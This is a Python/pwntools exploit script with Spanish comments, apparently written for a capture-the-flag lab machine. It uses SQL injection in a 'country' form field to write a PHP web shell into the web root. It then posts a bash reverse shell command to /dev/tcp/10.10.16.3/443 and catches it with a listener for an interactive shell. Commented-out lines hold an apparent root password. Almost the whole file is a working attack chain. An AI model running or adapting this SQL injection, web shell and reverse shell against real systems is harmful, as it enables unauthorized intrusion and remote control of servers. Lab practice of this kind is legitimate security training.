#!/usr/bin/python3

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)
	
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 3: # Si no tiene 3 argumentos explica y sale
	log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
	sys.exit(1)

# Variables globales
ip_address = sys.argv[1] # primer argumento
filename = sys.argv[2] # segundo argumento
main_url = "http://%s/" % ip_address # http://10.10.11.116/
lport = 443 # Puerto de escucha para el reverse shell

# Comprobar con el debugger pdb si las variables est치n recibiendo los valores correctos
# pdb.set_trace() 

def createFile():

	data_post = {
		'username': 'admin',
		'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % (filename)
	}

	r = requests.post(main_url, data=data_post)
# pdb.set_trace() 

def getAccess():                 # Hay que poner en escucha netcat -> nc -nlvp 443
	data_post = {
		'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'" # reverse shell tcp 443
	}
	r = requests.post(main_url + "%s" % filename, data=data_post) 

if __name__ == '__main__':
	createFile()
#	getAccess() # Llamando sin m치s a la funci칩n se tiene acceso a la shell si se est치 a la escucha
	try:          # Con estas funciones de pwn se abre directamente una consola en el mismo proceso.
		threading.Thread(target=getAccess, args=()).start() # Uso de hilos para escuchar en paralelo
	except Exception as e:
		log.error(str(e))
#	if shell.sock is None
#	else
	shell = listen(lport, timeout=20).wait_for_connection()
#	shell.sendline("su root")
#	time.sleep(5)
#	shell.sendline("uhc-9qual-global-pw")
	shell.interactive() # CONSOLA INTERACTIVA
